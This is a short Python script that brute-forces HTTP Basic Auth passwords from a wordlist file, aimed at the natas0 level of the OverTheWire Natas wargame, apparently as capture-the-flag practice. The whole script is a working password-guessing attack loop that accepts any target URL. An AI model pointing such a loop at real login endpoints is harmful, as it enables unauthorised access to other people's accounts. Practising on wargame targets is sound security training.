import requests
from requests.auth import HTTPBasicAuth
import time

def natas_breaker(target_url, username, wordlist_file):
    print(f"attac {target_url} with wordlist {wordlist_file}")

    try:
        with open(wordlist_file, "r") as f:
            for line in f:
                password = line.strip()
                time.sleep(0.5)
                response = requests.get(target_url, auth=HTTPBasicAuth(username, password))

                if response.status_code == 200:
                    print(f"Got the key is {password}")
                    return
                else:
                    print("Failed to get the keys")
    except FileNotFoundError:
        print("WOrdlist not found! maybe you forget it?")

target = "http://natas0.natas.labs.overthewire.org"
wordlist = "pass.txt"

natas_breaker(target, "natas0", wordlist)